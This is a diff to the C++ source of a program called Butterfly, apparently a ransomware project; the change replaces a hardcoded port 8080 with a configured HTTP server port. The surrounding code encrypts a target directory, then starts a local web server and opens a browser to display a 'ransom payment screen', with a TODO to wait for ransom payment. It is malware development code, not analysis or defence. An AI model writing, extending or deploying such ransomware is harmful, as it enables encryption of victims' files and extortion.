@@ -13,6 +13,8 @@ Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::Argument
     // init logging
     initLoggingFramework();
 
+    // creating the browser url with http server port
+    BROWSER_URL_PORT = butterfly::params::LOCALHOST_URL + ":" + std::to_string(butterfly::params::HTTP_SERVER_PORT);
 }
 
 void Butterfly::initLoggingFramework()
@@ -104,12 +106,12 @@ void Butterfly::run()
         encryptor->invokeDir(_args.dir, _args.protection);
 
         // After encryption start http server, gui or wallpaper
-        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8080);
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(butterfly::params::HTTP_SERVER_PORT);
         server->run(false);
 
         std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
         // After encryption open the browser and visualize the ransom payment screen
-        browser->open("http://127.0.0.1:8080", false);
+        browser->open(BROWSER_URL_PORT, false);
 
         // Blocking call to wait for the ransom payment
         //TODO: Wait for ransom payment
@@ -160,12 +162,12 @@ void Butterfly::run()
         encryptor->invokeDir(_args.encrypt, _args.protection);
 
         // After encryption start http server, gui or wallpaper
-        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8080);
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(butterfly::params::HTTP_SERVER_PORT);
         server->run(false);
 
         std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
         // After encryption open the browser and visualize the ransom payment screen
-        browser->open("http://127.0.0.1:8080", true);
+        browser->open(BROWSER_URL_PORT, true);
         // Finally stop the server
         server->stop();
     }
